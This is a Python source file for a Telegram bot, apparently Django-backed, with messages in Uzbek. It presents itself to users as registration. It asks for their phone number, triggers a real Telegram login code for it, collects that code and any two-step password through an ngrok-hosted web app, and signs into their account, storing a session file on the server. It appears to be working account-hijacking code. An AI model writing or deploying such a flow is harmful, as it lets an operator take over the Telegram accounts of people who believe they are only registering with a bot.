import json
import asyncio
from django.conf import settings
from telebot import TeleBot
from telebot.types import (
    Message,
    ReplyKeyboardMarkup,
    KeyboardButton,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    WebAppInfo
)
from telethon import utils, errors
from telethon.sync import TelegramClient

from .auth import is_authorized, register_or_authorize

import logging

# from .text import get_text as _
# from .helpers.auth import register_user
# from .keyboards import get_main_keyboard
# from .handlers import register_handlers

# logger = telebot.logger
# telebot.logger.setLevel(logging.INFO)

URL = "https://porpoise-knowing-eel.ngrok-free.app"

bot = TeleBot(settings.TELEGRAM_BOT_TOKEN)


def get_client(phone) -> TelegramClient:
    # sessions_dir = str(settings.BASE_DIR/'sessions')
    # session_name = sessions_dir + '/' + utils.parse_phone(phone=phone)
    session_name = "sessions/" + utils.parse_phone(phone=phone)
    return TelegramClient(session_name, settings.TELEGRAM_API_ID, settings.TELEGRAM_API_HASH)


user_auth_data = dict()


@bot.message_handler(commands=['help', 'start'])
def send_welcome(message: Message):
    user = is_authorized(message.from_user.id)
    logging.warning(user)

    if not user:
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button = KeyboardButton("📞 Telefon raqamini ulashish", request_contact=True)
        markup.add(button)
        msg = bot.send_message(message.chat.id, "Telefon raqamingizni ulashing:", reply_markup=markup)
        bot.register_next_step_handler(msg, process_phone_step)
        return

    bot.reply_to(message, "authorized.")


def process_phone_step(message: Message):
    # check if user actually share a contact number
    if not message.contact:
        bot.reply_to(message, "Siz kontaktingizni yubormadingiz.")
        return
    
    # check if that contact belongs to user (not other)
    if message.contact.user_id != message.from_user.id:
        bot.reply_to(message, "Bu raqam sizga tegishli emas.")
        return
    phone = message.contact.phone_number

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())
    
    client = get_client(phone)
    client.connect()

    try:
        result = client.send_code_request(phone=phone)
    except Exception as e:
        logging.error(e)
        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
        return

    # save phone hash temporarily
    user_auth_data[message.from_user.id] = {
        "phone": phone,
        "phone_hash": result.phone_code_hash
    }
    # user_auth_data[phone] = result.phone_code_hash

    # logging.warning(result)
    # logging.warning(result.phone_code_hash)

    # me = client.get_me()
    # logging.warning(me)

    client.disconnect()

    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = KeyboardButton("🔑 Kiritish", web_app=WebAppInfo(url=URL))
    markup.add(button)

    
    msg = bot.reply_to(
        message,
        "Iltimos raqamingizga yuborilgal kodni kiriting:",
        reply_markup=markup
    )
    bot.register_next_step_handler(msg, process_verify_code_step)


def process_verify_code_step(message: Message):
    if not message.web_app_data: return
    data = json.loads(message.web_app_data.data)

    verify_code = data['code']

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    auth = user_auth_data.get(message.from_user.id, None)

    if not auth: return

    client = get_client(auth['phone'])
    client.connect()

    phone = auth['phone']
    # parse the phone (removes '+' sign)
    parsed_phone = utils.parse_phone(phone=phone)

    tg_user = None
    two_step_detected = False

    client._phone_code_hash = {parsed_phone: auth['phone_hash']}

    try:
        tg_user = client.sign_in(phone=phone, code=verify_code)
        register_or_authorize(tg_user.id, phone)
    except errors.SessionPasswordNeededError:
        two_step_detected = True
    except Exception as e:
        logging.error(e)
        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
        return

    # hande 2fa detection
    if two_step_detected:
        markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button = KeyboardButton("🔑 Kiritish", web_app=WebAppInfo(url=URL))
        markup.add(button)
        
        msg = bot.reply_to(
            message,
            "Iltimos 2-bosqich kodni kiriting:",
            reply_markup=markup
        )
        bot.register_next_step_handler(msg, process_2fa_step)
        return

    client.disconnect()

    bot.reply_to(message, "✅ Siz muvofaqqiyatli ro'yxatdan o'tdingiz. \nBotdan foydalanish uchun yana /start komandasini bosing.")


def process_2fa_step(message: Message):
    if not message.web_app_data: return
    data = json.loads(message.web_app_data.data)

    pass_2fa = data['code']

    try:
        asyncio.get_running_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())

    auth = user_auth_data.get(message.from_user.id, None)

    if not auth: return

    client = get_client(auth['phone'])
    client.connect()

    phone = auth['phone']
    # parse the phone (removes '+' sign)
    parsed_phone = utils.parse_phone(phone=phone)

    client._phone_code_hash = {parsed_phone: auth['phone_hash']}

    try:
        tg_user = client.sign_in(phone=phone, password=pass_2fa)
        register_or_authorize(tg_user.id, phone)
    except Exception as e:
        logging.error(e)
        bot.reply_to(message, "Kutilmagan hatolik yuz berdi. Iltimos qayta urinib ko'ring.")
        return
    
    client.disconnect()
    
    bot.reply_to(message, "✅ Siz muvofaqqiyatli ro'yxatdan o'tdingiz. \nBotdan foydalanish uchun yana /start komandasini bosing.")




# register_handlers(bot)

bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()